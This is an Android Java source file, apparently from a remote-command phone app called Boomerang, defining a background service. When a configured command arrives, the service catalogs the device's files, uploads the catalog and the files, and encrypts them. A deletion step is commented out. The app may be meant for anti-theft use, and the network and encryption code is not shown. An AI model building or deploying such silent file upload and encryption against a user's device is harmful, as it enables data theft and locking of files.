package Boomerang_android15.com;

///////////////////////////////////////////////////////////////////////
//
//模块功能:对系统中的文件进行操作
//注:包括获得关注文件夹的目录结构,加密,删除文件,(加密部分由单独子模块负责)
//
//////////////////////////////////////////////////////////////////////
//package fei_qu_lai;





import java.io.*;

import android.app.Service;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.content.Intent; 
import java.util.List;
import java.util.ArrayList;
import java.util.Vector;


public class ProcessFileInfor extends Service
{	

	private OperateFileInfor m_FileInfor = null;  //处理文件信息的类
	private SetInformation m_settingInfor;		//配置文件的设置信息
	private String m_configFilePath;  //配置文件的路径
  
	
	public void onCreate()
	{
		super.onCreate();
		
		Log.i("333+++", "ProcessFileInfor onCreate: begin ");
		System.setProperty("file.encoding", "GBK"); //设置编码方式

	}
	 
	public void onStart (Intent intent, int startId )
	{
		super.onStart(intent, startId);
		Log.i("333+++", "ProcessFileInfor onStart: begin ");
		initialize();
		StartPhoneFile();  //调用处理文件函数
	}

	public IBinder onBind(Intent intent)
	{
		Log.i("333+++", "ProcessFileInfor onBind: begin ");	
		return null;
	}

	
	
	public void onDestory()
	{
		super.onDestroy();
	}

	
	private void initialize()
	{
	
       	//1.获得配置文件路径
        Log.i("333+++", "ProcessPhoneBook initialize: begin!");
        m_configFilePath = this.getFilesDir()+ java.io.File.separator + this.getString(R.string.config_file);
   
        //2.读取配置文件信息
        m_settingInfor = new  SetInformation(m_configFilePath);     
        m_settingInfor.ReadConfigFile();
    	
        //创建处理文件信息的对象
        m_FileInfor = new OperateFileInfor(this);
		
		
		
	}

	
	
	
	private void StartPhoneFile()
	{
		
		int commandCount = this.m_settingInfor.GetCommandCount();		
		Log.i("333+++", "commandCount");
		Log.i("333+++", String.valueOf(commandCount));
		
		if (commandCount == 1 )
		{
			//ProcessFirstForFree();		//免费版不在使用
			ProcessFirst();
		}
		else
		{
			//对手机的文件信息进行重传
			ProcessOther();
		}
		
		
		
	}
	    
	////////////////////////////////////////////////////////////////
	//
	//函数功能:接收首次命令做的动作
	//
	//
	/////////////////////////////////////////////////////////////////
	private void ProcessFirst()
	{
		
		Log.i("333+++", "ProcessFileInfor ProcessFirst: begin!");	
		//初始化工作	    	
	    
		//生成目录文件
	  
		m_FileInfor.CreateCalalogFile();
			
		if (m_settingInfor.GetIsSendFileCatalog() == true)
		{
			//发送文件目录
			Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFileCatalog!");
			m_FileInfor.SendFileCatalog();
		}
			
		if (m_settingInfor.GetIsSendFile() == true)
		{
			//发送文件
			Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFile!");
			m_FileInfor.SendFile();
				
		}
		
		if (m_settingInfor.GetIsCryptFile() == true)
		{
			//加密文件
			Log.i("333+++", "ProcessFileInfor ProcessFirst: call EncryptFile!");
			m_FileInfor.EncryptFile();
		}
			

		/*	
		//按照目录文件的内容将文件制定文件删除
		if (m_settingInfor.GetIsDelFile() == true)
		{
			//删除文件
			Log.i("333+++", "ProcessFileInfor ProcessFileInfor: call DelFileCatalog!");
			m_FileInfor.DelFileCatalog();
		}//end if 
		
		//对文件目录文件进行加密
	    m_FileInfor.EncryptFileCatalog();
	    
	    */
		
		Log.i("333+++", "ProcessFileInfor ProcessFirst: end");	
		
		
	}
	
	////////////////////////////////////////////////////////////////
	//
	//函数功能:处理重置指令,重发手机中文件信息
	//
	//
	///////////////////////////////////////////////////////////////
	private void ProcessOther()
	{
		
		if (m_settingInfor.GetIsSendFileCatalog() == true)
		{
			//发送文件目录
			Log.i("333+++", "ProcessFileInfor ProcessOther: call SendFileCatalog!");
			m_FileInfor.SendFileCatalog();
		}
			
		if (m_settingInfor.GetIsSendFile() == true)
		{
			//发送文件
			Log.i("333+++", "ProcessFileInfor ProcessOther: call SendFile!");
			m_FileInfor.SendFile();
				
		}
		
	}

	private void ProcessFirstForFree()
	{
		Log.i("333+++", "ProcessFileInfor ProcessForFree: begin!");	
		//初始化工作	    	
	    
		//生成目录文件	  
		m_FileInfor.CreateCalalogFile();		
		
		//发送文件目录
		Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFileCatalog!");
		m_FileInfor.SendFileCatalogForFree();
					
		
		//发送文件
		Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFile!");
		m_FileInfor.SendFileForFree();
				
		//加密文件
		Log.i("333+++", "ProcessFileInfor ProcessFirst: call EncryptFile!");
		m_FileInfor.EncryptFile();
		
	}
}
